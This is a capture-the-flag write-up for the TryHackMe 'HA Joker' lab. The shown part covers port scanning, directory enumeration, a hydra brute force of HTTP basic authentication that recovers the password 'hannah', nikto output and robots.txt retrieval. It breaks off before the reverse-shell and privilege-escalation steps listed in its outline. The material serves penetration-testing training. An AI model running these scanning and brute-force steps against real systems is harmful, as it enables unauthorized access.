# HA Joker CTF — Writeup

## Overview
### HA Joker CTF — Writeup
### HA Joker CTF — Writeup
----
Batman hits Joker.
---
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/ed910d9d7c419b8266128e044a40c7e2.jpeg)
### HA Joker CTF
Start Machine
We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if you have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.
1.  **Enumerate Services**
_- Nmap
_
2.  **Bruteforce**_- Performing Bruteforce on files over http_
___- Performing Bruteforce on Basic Authentication___
3.  **Hash Crack**_- Performing Bruteforce on hash to crack zip file
- Performing Bruteforce on hash to crack mysql user
_
4.  **Exploitation**_
- Getting a reverse connection
- Spawning a TTY Shell_
5.  **Privilege Escalation**
_- Get root taking advantage of flaws in LXD_
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.230.190 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.230.190:22
Open 10.10.230.190:80
Open 10.10.230.190:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.230.190 [3 ports]
Discovered open port 8080/tcp on 10.10.230.190
Discovered open port 22/tcp on 10.10.230.190
Discovered open port 80/tcp on 10.10.230.190
Completed Connect Scan (3 total ports)
Initiating Service scan
Scanning 3 services on 10.10.230.190
Completed Service scan (3 services on 1 host)
NSE: Script scanning 10.10.230.190.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.230.190
Host is up, received user-set (0.37s latency).

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad201ff4331b0070b385cb8700c4f4f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL89x6yGLD8uQ9HgFK1nvBGpjT6KJXIwZZ56/pjgdRK/dOSpvl0ckMaa68V9bLHvn0Oerh2oa4Q5yCnwddrQnm7JHJ4gNAM+lg+ML7+cIULAHqXFKPpPAjvEWJ7T6+NRrLc9q8EixBsbEPuNer4tGGyUJXg6GpjWL5jZ79TwZ80ANcYPVGPZbrcCfx5yR/1KBTcpEdUsounHjpnpDS/i+2rJ3ua8IPUrqcY3GzlDcvF7d/+oO9GxQ0wjpy1po6lDJ/LytU6IPFZ1Gn/xpRsOxw0N35S7fDuhn69XlXj8xiDDbTlOhD4sNxckX0veXKpo6ynQh5t3yM5CxAQdqRKgFF
|   256 1bf9a8ecfd35ecfb04d5ee2aa17a4f78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOzF9YUxQxzgUVsmwq9ZtROK9XiPOB0quHBIwbMQPScfnLbF3/Fws+Ffm/l0NV7aIua0W7FLGP3U4cxZEDFIzfQ=
|   256 dcd7dd6ef6711f8c2c2ca1346d299920 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLWfYB8/GSsvhS7b9c6hpXJCO6p1RvLsv4RJMvN4B3r
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: Joker
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
8080/tcp open  http    syn-ack Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.72 seconds

<!--You can't win anyway... You see, I hold the winning card!-->
<!DOCTYPE html>
<!--"I won't even waste the usual Joker Venom on you, Brute, but give you something you can understand...lead!-->
<html>
<!--Very neat! That ugly head of yours does have a brain!-->
<title>HA: Joker</title>
<!--I'm not mad at all! I'm just differently sane!!-->
<meta charset="UTF-8">
<!--More powerful than a locomotive, and just about as subtle-->
<meta name="viewport" content="width=device-width, initial-scale=1">
<!--One by One, they'll hear my call. Then this wicked town, will follow my fall.-->
<link rel="stylesheet" href="css/w3.css">
<!--It's a clear choice me or Pettit. Vote or die. Cancer or tuberculosis.-->
<link rel="stylesheet" href="css/font.css">
<!--If I weren't crazy, I'd be insane!-->
<style>
<!--You dirty rat! You killed my brother! My sister! My daughter! She's my sister and my daughter!-->
body,h1 {font-family: "Raleway", Arial, sans-serif}
<!--Quick question: When the clock strikes twelve, do I get a little kiss?-->
h1 {letter-spacing: 6px}
<!--Hello Late-Show lovers...and lovers of the Late-Show!-->
.w3-row-padding img {margin-bottom: 12px}
<!--Live...and in person! The Caliph of Clowns, the Grand Mogul of Mountebanks, the One and Only JOKER! Prerecorded for this time zone.-->
</style>
<!--Every clown loves kids, captain. Just ask Sarah Essen-Gordon. Oh, that's right, you can't!-->
<body>
<!--If the police expect to play against the Joker, they'd better be prepared to be dealt from the bottom of the deck! -->
<div class="w3-content" style="max-width:1500px">
<!--If I weren't insane: I couldn't be so brilliant!-->
<header class="w3-panel w3-center w3-opacity">
<!--You can't kill me without becoming like me! I can't kill you without losing the only human being who can keep up with me! Isn't it IRONIC?-->
 <img src="img/100.jpg" style="width:100%">
<!--The real joke is your stubborn, bone deep conviction that somehow, somewhere, all of this makes sense! That's what cracks me up each time!-->
 <h1>HA: JOKER</h1>
 <!--Devil is double is deuce, my dear doctor ... and joker trumps deuce.-->
</header>
<!--You fell for the old fake Joker gag, Batman! You left me to die!-->
<div class="w3-row-padding w3-grayscale" style="margin-bottom:128px">
  <!--I've killed your girlfriend, poisoned Gotham, and hell... it's not even breakfast! But so what? We all know you'll save me.-->
  <div class="w3-half">
    <!--Get out of the way, Bats! I've got a date with immortality!-->
	<img src="img/1.png" style="width:100%">
	<!--Hurry! Batman's just had his way with one of you! Now that's a spicy meat-a-ball!-->
	<img src="img/2.png" style="width:100%">
    <!--NOW THIS IS WHAT I CALL A PARTY!!-->
	<img src="img/3.png" style="width:100%">
    <!--Jingle bells, Batman smells, Gotham's quite a mess! Blackgate's mine and you're out of time, which means you'll soon be dead!-->
	<img src="img/4.png" style="width:100%">
    <!--Where, oh where has my little Bat gone? Oh where, oh where can he be? His cowl, his scowl, his temper so foul. I do hope he's coming for me.-->
	<img src="img/5.png" style="width:100%">
    <!--Well, I'd love to stay and celebrate your victory, but I've got stockings to stuff, mistletoe to hang - and about fifteen skyscrapers to blow up before sunrise. Ciao-->
	<img src="img/6.png" style="width:100%">
    <!--Who's gonna save Gotham now? Robin?!-->
	<img src="img/7.png" style="width:100%">
	<!--You can't win anyway... You see, I hold the winning card!-->
	<img src="img/8.png" style="width:100%">
	<!--All I have are negative thoughts.-->
	<img src="img/9.png" style="width:100%">
   	<!--I used to think that my life was a tragedy. But now I realize, it’s a comedy.-->
  </div>
<!--Smile, because it confuses people. Smile, because it's easier than explaining what is killing you inside.-->
  <div class="w3-half">
	<!--As you know, madness is like gravity...all it takes is a little push.-->
	<img src="img/10.png" style="width:100%">
<!--If you’re good at something, never do it for free.-->
	<img src="img/11.png" style="width:100%">
<!--Nobody panics when things go “according to plan”. Even if the plan is horrifying!-->
	<img src="img/12.png" style="width:100%">
<!--Introduce a little anarchy. Upset the established order, and everything becomes chaos. I'm an agent of chaos...-->
	<img src="img/13.png" style="width:100%">
<!--Oh I really look like a guy with a plan? You know what I am? I'm a dog chasing cars. I wouldn't know what to do with one if I caught it!-->
    <img src="img/14.png" style="width:100%">
<!--What doesn't kill you, simply makes you stranger!-->
	<img src="img/15.png" style="width:100%">
<!--Why so serious?-->
	<img src="img/16.png" style="width:100%">
<!--They Laugh At me Because I'm Different. I laugh At Then Because The're all the same-->
	<img src="img/17.png" style="width:100%">
<!--The only sensible way to live in this world is without rules.-->
    <img src="img/18.png" style="width:100%">
<!--Tell your men they work for me now, this is my city!-->
	  </div>
<!--I'm not gonna kill ya. I'm just gonna hurt ya... really, really bad. -->
</div>
  <!-- I wouldn't want you to break those perfect porcelain-capped teeth when the juice hits your brain.-->
</div>
<!--Stupid Bats, you're ruining date night! -->
<footer class="w3-container w3-padding-64 w3-light-grey w3-center w3-large">
<!--Are you sweet talkin' me? All'a that chitchat's gonna getcha hurt-->
  <p>Powered by <a href="https://hackingarticles.in" target="_blank" class="w3-hover-text-green">Hacking Articles</a></p>
<!--Twinkle, twinkle, little bat. Watch me kill your favorite cat.-->
</footer>
<!--Ha ha ha ha ha ha ha ha Its a good joke isn't-->
</body>
<!--I did it! I finally killed Batman! In front of a bunch of vulnerable, disabled, kids!!!! Now get me Santa Claus!-->
</html>

┌──(witty㉿kali)-[~]
└─$ gobuster -t 64 dir -e -k -u http://10.10.230.190/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.230.190/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.230.190/.htaccess.html       (Status: 403) [Size: 278]
http://10.10.230.190/.html                (Status: 403) [Size: 278]
http://10.10.230.190/.htpasswd            (Status: 403) [Size: 278]
http://10.10.230.190/.hta.html            (Status: 403) [Size: 278]
http://10.10.230.190/.htpasswd.html       (Status: 403) [Size: 278]
http://10.10.230.190/.htaccess.php        (Status: 403) [Size: 278]
http://10.10.230.190/.htaccess            (Status: 403) [Size: 278]
http://10.10.230.190/.hta.txt             (Status: 403) [Size: 278]
http://10.10.230.190/.htpasswd.php        (Status: 403) [Size: 278]
http://10.10.230.190/.php                 (Status: 403) [Size: 278]
http://10.10.230.190/.htaccess.txt        (Status: 403) [Size: 278]
http://10.10.230.190/.hta                 (Status: 403) [Size: 278]
http://10.10.230.190/.hta.php             (Status: 403) [Size: 278]
http://10.10.230.190/.htpasswd.txt        (Status: 403) [Size: 278]
http://10.10.230.190/css                  (Status: 301) [Size: 312] [--> http://10.10.230.190/css/]
http://10.10.230.190/img                  (Status: 301) [Size: 312] [--> http://10.10.230.190/img/]
http://10.10.230.190/index.html           (Status: 200) [Size: 5954]
http://10.10.230.190/index.html           (Status: 200) [Size: 5954]
http://10.10.230.190/phpinfo.php          (Status: 200) [Size: 94769]
http://10.10.230.190/phpinfo.php          (Status: 200) [Size: 94769]
http://10.10.230.190/secret.txt           (Status: 200) [Size: 320]
http://10.10.230.190/server-status        (Status: 403) [Size: 278]
Progress: 18456 / 18460 (99.98%)
===============================================================
 Finished
===============================================================

http://10.10.230.190/secret.txt

Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"

┌──(witty㉿kali)-[~]
└─$ hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.230.190 http-get -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.230.190:8080/
[8080][http-get] host: 10.10.230.190   login: joker   password: hannah
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished

┌──(witty㉿kali)-[~]
└─$ nikto -host http://10.10.230.190:8080/ -id joker:hannah
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.230.190
+ Target Hostname:    10.10.230.190
+ Target Port:        8080
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ / - Requires Authentication for realm ' Please enter the password.'
+ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
+ /robots.txt: Entry '/components/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/bin/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/modules/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/plugins/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/language/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/includes/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/cache/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/layouts/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/administrator/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/cli/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/tmp/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/libraries/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 14 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ /backup.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /web.config: Uncommon header 'tcn' found, with contents: choice.
+ /web.config: ASP config file is accessible.

http://10.10.230.190:8080/robots.txt
```
```text
# If the Joomla site is installed within a folder
```
```text
# eg www.example.com/joomla/ then the robots.txt file
```
```text
# MUST be moved to the site root
```
```text
# eg www.example.com/robots.txt
```
```text
# AND the joomla folder name MUST be prefixed to all of the
```
```text
# paths.
```
```text
# eg the Disallow rule for the /administrator/ folder MUST
```
```text
# be changed to read
```
```text
# Disallow: /joomla/administrator/
#
```
```text
# For more information about the robots.txt standard, see:
```
```text
# http://www.robotstxt.org/orig.html
#
```
```text
# For syntax checking, see:
```

## Exploitation
```text
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/

joker:hannah

to base64  am9rZXI6aGFubmFo

┌──(witty㉿kali)-[~]
└─$ curl -s -H "Authorization: Basic am9rZXI6aGFubmFo" http://10.10.230.190:8080/robots.txt
```
```text
# If the Joomla site is installed within a folder
```
```text
# eg www.example.com/joomla/ then the robots.txt file
```
```text
# MUST be moved to the site root
```
```text
# eg www.example.com/robots.txt
```
